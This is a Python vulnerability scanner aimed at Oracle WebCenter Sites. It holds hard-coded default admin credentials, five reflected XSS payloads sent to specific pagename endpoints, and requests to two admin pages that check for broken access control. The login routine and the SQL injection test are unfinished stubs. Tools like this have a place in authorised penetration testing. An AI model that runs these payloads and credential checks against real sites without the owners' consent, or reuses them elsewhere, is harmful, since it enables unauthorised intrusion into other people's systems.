import argparse
import re

import requests

requests.packages.urllib3.disable_warnings()
parser = argparse.ArgumentParser(description="WebCenter Sites vulnerability scanner")
parser.add_argument("url", action="store")
args = parser.parse_args()
satellite = "/cs/Satellite"


def parse_url():
    if not args.url.startswith("http"):
        print("[-] URL scheme is invalid")
        exit(1)

    satellite_len = len(satellite)
    try:
        satellite_index = args.url.index(satellite)
        return args.url[:satellite_index + satellite_len]
    except ValueError:
        return args.url.rstrip("/") + satellite


def request(method, endpoint):
    return requests.request(method, endpoint, verify=False, allow_redirects=False)


def do_login(endpoint):
    # todo: Try default login and return True if successful
    return False


def test_login():
    username = "fwadmin"
    password = "xceladmin"
    login_page_keywords = ("WebCenter Sites", "Username", "Password", "Login")
    alternative_login = "/cas/login"
    response = request("GET", url)
    if response.status_code == 200 and all(kw in response.text for kw in login_page_keywords):
        if do_login(url):
            return True

    alternative_endpoint = url.rstrip(satellite) + alternative_login
    response = request("GET", alternative_endpoint)
    if response.status_code == 200 and all(kw in response.text for kw in login_page_keywords):
        if do_login(alternative_endpoint):
            return True

    return False


def test_xss():
    check_str = "<script>alert(24)</script>"
    payloads = [
        'c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq"><script>alert(24)</script>',
        'destpage="<h1xxx<scriptalert(24)</script&pagename=OpenMarket/Xcelerate/UIFramework/LoginError',
        'c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq"><script>alert(24)</script>',
        'pagename=OpenMarket/Xcelerate/Actions/Security/NoXceleditor&WemUI=qqq%27;}</script><script>alert(24)</script>',
        'pagename=OpenMarket/Xcelerate/Actions/Security/ProcessLoginRequest&WemUI=qqq%27;}</script><script>alert(24)</script>'
    ]
    for p in payloads:
        try:
            response = request("GET", f"{url}?{p}")
            if check_str in response.text:
                print(f"[+] Possible XSS found: {p}")
        except requests.exceptions.RequestException as ex:
            pass


def test_broken_acl():
    check_rex = r"<script.*<throwexception/>"
    private_addresses = [
        'pagename=OpenMarket/Xcelerate/Admin/WebReferences',
        'pagename=OpenMarket/Xcelerate/Admin/Slots'
    ]
    for pa in private_addresses:
        try:
            response = request("GET", f"{url}?{pa}")
            if re.search(check_rex, response.text):
                print(f"[+] Possible Broken ACL found: {pa}")
        except requests.exceptions.RequestException as ex:
            print(f"[-] An error occurred: {ex}")

    return False


def test_sqli():
    pass


if __name__ == "__main__":
    url = parse_url()
    print(f"[!] Start scanning {url}")
    print("[*] Testing default login")
    login = test_login()
    if not login and not input("[?] The application may not run WebCenter Sites. Do you want to continue anyway? [N/y]").lower() in ('y', 'yes'):
        exit()

    test_xss()
    bacl = test_broken_acl()
    if not bacl and not input("[?] It is recommended to test SQLi if there is Broken Access Control. Do you want to continue anyway? [N/y]").lower() in ('y', 'yes'):
        exit()

    test_sqli()



